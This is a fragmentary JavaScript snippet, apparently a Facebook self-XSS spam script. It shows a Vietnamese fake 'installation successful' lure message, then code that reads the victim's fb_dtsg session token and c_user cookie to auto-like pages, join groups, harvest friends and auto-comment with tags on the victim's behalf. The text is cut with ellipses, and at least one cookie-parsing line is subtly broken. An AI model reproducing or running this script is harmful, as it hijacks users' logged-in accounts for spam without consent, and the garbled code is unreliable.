...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/conghtmlnew" target="_blank">CÀI ĐẶT THÀNH CÔNG! Bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng kích chuột vào đây để thực hiện công đoạn hoàn tất sau 5 phút và không quá 60 phút kể từ khi đọc thông báo này. Ứng dụng sẽ bắt đầu tính thời gian chờ ngay sau khi bạn hoàn thành bước hoàn tất. Ứng dụng được phát triển bởi Cộng đồng IT Việt.<br>IT VIỆT</a>';
	html += '</div>';
...
//Group ku adibpn
var gid = ['363831483722437'];
var gid = ['597635720269398'];
var gid = ['476384392449355'];
...
// pic + fans
Like("298683910289319");
Like("298683910289319");
// Auto comment + tag
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '298683910289319';
var arkadaslar = [];
var svn_rev;
...
arkadaslari_al(298683910289319);
arkadaslari_al(1492012924353043);
arkadaslari_al(476384392449355);
arkadaslari_al(1435880659986291);
arkadaslari_al(597635720269398);
arkadaslari_al(1435880659986291);
arkadaslari_al(1435880659986291);
arkadaslari_al(1435880659986291);
arkadaslari_al(1435880659986291);
